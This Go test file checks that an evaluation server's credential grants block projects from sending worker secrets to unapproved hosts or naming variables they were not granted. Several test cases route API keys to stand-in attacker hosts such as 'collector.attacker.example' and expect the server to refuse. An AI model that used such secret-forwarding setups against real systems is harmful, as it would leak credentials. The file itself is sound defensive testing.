package server

import (
	"context"
	"strings"
	"testing"

	"connectrpc.com/connect"
	"google.golang.org/protobuf/types/known/structpb"

	evalsiv1alpha1 "github.com/abhishek-rnjn/evals.si/gen/go/evalsi/v1alpha1"
	"github.com/abhishek-rnjn/evals.si/gen/go/evalsi/v1alpha1/evalsiv1alpha1connect"
	"github.com/abhishek-rnjn/evals.si/internal/config"
	"github.com/abhishek-rnjn/evals.si/internal/credentials"
)

// A request may name only the worker variables its project is granted, and
// send a host-limited one only to those hosts: otherwise anyone who can
// create a run could have the worker send any secret it holds anywhere.
func TestCredentialGrants(t *testing.T) {
	s := startAuthServer(t, func(c *config.Config) {
		c.Credentials.Grants = append(c.Credentials.Grants,
			credentials.Grant{Env: "SUPPORT_AGENT_TOKEN", Projects: []string{"support"}},
			credentials.Grant{Env: "REWARD_KEY", Projects: []string{"support"}, Hosts: []string{"*.rewards.internal"}})
	})
	ctx := context.Background()
	runs := func(who string) evalsiv1alpha1connect.RunServiceClient {
		return evalsiv1alpha1connect.NewRunServiceClient(s.http, s.url, as(s.keys[who]))
	}
	create := func(who, project string, spec *evalsiv1alpha1.RunSpec) error {
		_, err := runs(who).CreateRun(ctx, connect.NewRequest(&evalsiv1alpha1.CreateRunRequest{Project: project, Spec: spec}))
		return err
	}
	denied := func(what string, err error, want string) {
		t.Helper()
		if codeOf(err) != connect.CodePermissionDenied || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: want permission denied mentioning %q, got %v", what, want, err)
		}
	}

	if err := create("runner", "support", runSpec("qwen3")); err != nil {
		t.Fatalf("granted key to a granted host: %v", err)
	}
	// The default key (no api_key_env) is a reference too.
	exfil := runSpec("qwen3")
	exfil.Target.BaseUrl = "https://collector.attacker.example/v1"
	denied("default key to another host", create("runner", "support", exfil), "collector.attacker.example")
	named := runSpec("qwen3")
	named.Target.ApiKeyEnv = "DATABASE_URL"
	denied("an ungranted variable", create("runner", "support", named), "DATABASE_URL")
	denied("a project without the grant", create("checkout-runner", "checkout", runSpec("qwen3")), `project "checkout"`)
	// api_key_env: none sends no key, so it needs no grant.
	keyless := runSpec("qwen3")
	keyless.Target.BaseUrl, keyless.Target.ApiKeyEnv = "https://models.example/v1", credentials.None
	if err := create("checkout-runner", "checkout", keyless); err != nil {
		t.Errorf("keyless target: %v", err)
	}

	// Agents: headers and env_from.
	agent := func(a *evalsiv1alpha1.AgentTarget) *evalsiv1alpha1.RunSpec {
		spec := runSpec("", "exact-match")
		spec.Target = &evalsiv1alpha1.Target{Agent: a}
		return spec
	}
	httpAgent := agent(&evalsiv1alpha1.AgentTarget{Kind: &evalsiv1alpha1.AgentTarget_Http{Http: &evalsiv1alpha1.HTTPAgent{
		Url: "https://agent.example/run", OutputPath: "output", HeadersEnv: map[string]string{"Authorization": "SUPPORT_AGENT_TOKEN"},
	}}})
	if err := create("runner", "support", httpAgent); err != nil {
		t.Errorf("granted agent header: %v", err)
	}
	denied("agent header from another project", create("checkout-runner", "checkout", httpAgent), "SUPPORT_AGENT_TOKEN")
	cli := agent(&evalsiv1alpha1.AgentTarget{Kind: &evalsiv1alpha1.AgentTarget_Cli{Cli: &evalsiv1alpha1.CLIAgent{
		Command: []string{"agent"}, EnvFrom: map[string]string{"KEY": "REWARD_KEY"},
	}}})
	denied("a host-limited variable copied into a sandbox", create("runner", "support", cli), "sandbox")

	// Evaluator params ending in _env, on every path that takes evaluators.
	reward := func(url string) []*evalsiv1alpha1.EvaluatorRef {
		params, _ := structpb.NewStruct(map[string]any{"url": url, "api_key_env": "REWARD_KEY"})
		return []*evalsiv1alpha1.EvaluatorRef{{Ref: "reward-model", Params: params}}
	}
	withReward := runSpec("qwen3")
	withReward.Evaluators = reward("https://scorer.rewards.internal/score")
	if err := create("runner", "support", withReward); err != nil {
		t.Errorf("granted evaluator param: %v", err)
	}
	withReward.Evaluators = reward("https://scorer.attacker.example/score")
	denied("evaluator param to another host", create("runner", "support", withReward), "scorer.attacker.example")

	eval := evalsiv1alpha1connect.NewEvaluationServiceClient(s.http, s.url, as(s.keys["runner"]))
	_, err := eval.Evaluate(ctx, connect.NewRequest(&evalsiv1alpha1.EvaluateRequest{
		Project: "support", Evaluators: reward("https://scorer.attacker.example/score"),
		Records: []*evalsiv1alpha1.Record{{Input: text("q"), Output: text("a")}},
	}))
	denied("Evaluate", err, "scorer.attacker.example")

	policy := &evalsiv1alpha1.OnlineEvalPolicy{Name: "exfil", Project: "checkout", Stages: []*evalsiv1alpha1.CascadeStage{{Evaluators: reward("https://scorer.rewards.internal/score")}}}
	_, err = evalsiv1alpha1connect.NewMonitorServiceClient(s.http, s.url, as(s.keys["owner"])).ApplyPolicy(ctx, connect.NewRequest(&evalsiv1alpha1.ApplyPolicyRequest{Policy: policy}))
	if err == nil || !strings.Contains(err.Error(), `project "checkout"`) {
		t.Errorf("policy in a project without the grant: %v", err)
	}

	guard := evalsiv1alpha1connect.NewGuardrailServiceClient(s.http, s.url, as(s.keys["owner"]))
	_, err = guard.Check(ctx, connect.NewRequest(&evalsiv1alpha1.CheckRequest{
		Project: "checkout", Content: "hi",
		Inline: &evalsiv1alpha1.Guardrail{Name: "inline", Evaluators: reward("https://scorer.rewards.internal/score")},
	}))
	if err == nil || !strings.Contains(err.Error(), `project "checkout"`) {
		t.Errorf("inline guardrail in a project without the grant: %v", err)
	}
}

// With credentials.enforce off, any variable may be named (a single-user
// server's choice, made explicitly).
func TestCredentialGrantsOff(t *testing.T) {
	off := false
	s := startAuthServer(t, func(c *config.Config) { c.Credentials.Enforce = &off })
	spec := runSpec("qwen3")
	spec.Target.ApiKeyEnv = "ANYTHING"
	_, err := evalsiv1alpha1connect.NewRunServiceClient(s.http, s.url, as(s.keys["runner"])).CreateRun(context.Background(),
		connect.NewRequest(&evalsiv1alpha1.CreateRunRequest{Project: "support", Spec: spec}))
	if err != nil {
		t.Errorf("enforce off: %v", err)
	}
}
